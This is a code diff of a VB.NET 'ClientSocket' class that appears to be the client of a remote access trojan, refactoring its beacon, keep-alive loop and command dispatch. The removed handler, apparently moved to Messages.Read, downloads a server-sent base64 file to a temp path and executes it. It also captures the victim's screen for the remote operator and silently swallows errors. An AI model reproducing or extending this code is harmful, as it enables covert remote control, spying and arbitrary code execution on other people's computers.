@@ -30,11 +30,12 @@ Public Class ClientSocket
 
             isConnected = True
             Send(Info)
-            BeginReceive()
+
+            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
 
             While isConnected
-                Threading.Thread.Sleep(5000)
-                Send("ping?")
+                Threading.Thread.Sleep(30 * 1000)
+                Send("Alive?")
             End While
 
         Catch ex As Exception
@@ -50,14 +51,6 @@ Public Class ClientSocket
 
     End Function
 
-    Private Shared Sub BeginReceive()
-        Try
-            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
-        Catch ex As Exception
-        End Try
-    End Sub
-
-
     Private Shared Sub EndReceive(ByVal ar As IAsyncResult)
         Try
             S = ar.AsyncState
@@ -66,7 +59,7 @@ Public Class ClientSocket
                 MS.Write(Buffer, 0, Received)
                 If BS(MS.ToArray).Contains(EOF) Then
 
-                    Dim T As New Threading.Thread(AddressOf Read)
+                    Dim T As New Threading.Thread(AddressOf Messages.Read)
                     T.Start(MS.ToArray)
 
                     MS.Flush()
@@ -79,31 +72,7 @@ Public Class ClientSocket
         End Try
     End Sub
 
-    Private Shared Sub Read(ByVal b As Byte())
-        Try
-            Dim A As String() = Split(BS(b).Replace(EOF, Nothing), SPL)
-            Select Case A(0)
-                Case "CLOSE"
-                    Environment.Exit(0)
-
-                Case "DW"
-                    Dim NewFile = Path.GetTempFileName + A(1)
-                    File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
-                    Threading.Thread.Sleep(500)
-                    Diagnostics.Process.Start(NewFile)
-
-                Case "RD-"
-                    Send("RD-")
-
-                Case "RD+"
-                    Send("RD+" + SPL + BS(RemoteDesktop.Capture(A(1), A(2))))
-
-            End Select
-        Catch ex As Exception
-        End Try
-    End Sub
-
-    Private Shared Sub Send(ByVal msg As String)
+    Public Shared Sub Send(ByVal msg As String)
         Try
             Dim M As New MemoryStream
             M.Write(SB(msg), 0, msg.Length)
